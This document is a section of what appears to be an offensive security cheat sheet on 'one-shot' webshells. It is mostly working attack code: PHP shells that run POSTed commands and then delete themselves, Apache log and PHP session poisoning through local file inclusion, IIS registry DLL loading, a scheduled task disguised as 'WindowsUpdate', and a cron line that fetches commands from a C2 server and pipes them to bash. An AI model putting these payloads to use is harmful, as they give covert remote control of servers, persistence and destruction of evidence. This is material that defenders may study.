## 8. ONE-SHOT WEBSHELL (一过性 WebShell)

One-shot WebShells execute a single command and then self-destruct or leave no trace.

### 8.1 Fileless WebShell (Memory-Only)

**PHP eval-in-memory:**

```php
<?php
// This WebShell never writes to disk after initial placement
// Execute command, return result, and produce no persistent artifacts
$cmd = $_POST['cmd'] ?? '';
if ($cmd) {
    $result = `$cmd 2>&1`;
    echo base64_encode($result);
    // No file operations, no database writes, no logs
}
?>
```

### 8.2 Log-Based WebShell

**Apache/Nginx log poisoning to create WebShell:**

```
Step 1: Inject PHP code into access log
  curl -H "User-Agent: <?php @eval(\$_POST['cmd']); ?>" http://target/

Step 2: Access log file via LFI
  http://target/index.php?file=/var/log/apache2/access.log

Step 3: Execute commands via the log
  POST /index.php?file=/var/log/apache2/access.log
  cmd=system('id');
```

**PHP session file poisoning:**

```php
<?php
// Step 1: Upload a file that sets a PHP session variable
// Step 2: Session file contains: cmd|s:4:"whoami";
// Step 3: Include session file via LFI
// Step 4: PHP unserializes and executes
?>
```

### 8.3 Registry-Based WebShell (Windows/IIS)

```
Windows Registry path for IIS configurations:
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters

Concept:
1. Write a malicious ISAPI filter DLL path to the registry
2. IIS loads the DLL on next restart
3. DLL acts as a WebShell

Or use AppInit_DLLs:
  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
  AppInit_DLLs = C:\malicious.dll
```

### 8.4 Scheduled Task-Based WebShell

**Windows scheduled task persistence:**

```
# Create a scheduled task that runs a PowerShell WebShell listener
schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -Command ..." /sc daily /st 02:00
```

**Linux cron-based persistence:**

```
# Add a cron job that periodically checks for commands
*/5 * * * * curl -s http://c2-server/cmd | bash
```

### 8.5 Self-Destructing WebShell

```php
<?php
// Execute command and then delete itself
$cmd = $_POST['cmd'] ?? '';
if ($cmd) {
    $result = shell_exec($cmd . ' 2>&1');
    echo $result;

    // Self-destruct after execution
    unlink(__FILE__);

    // OR: overwrite with benign content
    file_put_contents(__FILE__, '<?php /* empty */ ?>');
}
?>
```

**Conditional self-destruct:**

```php
<?php
// Self-destruct after N executions
$counter_file = sys_get_temp_dir() . '/.counter_' . md5(__FILE__);
$count = (int)@file_get_contents($counter_file);
$count++;

if ($count >= 5) {
    // After 5 uses, remove all traces
    @unlink($counter_file);
    @unlink(__FILE__);
    exit('Expired');
}

@file_put_contents($counter_file, $count);
@eval($_POST['code']);
?>
```

---

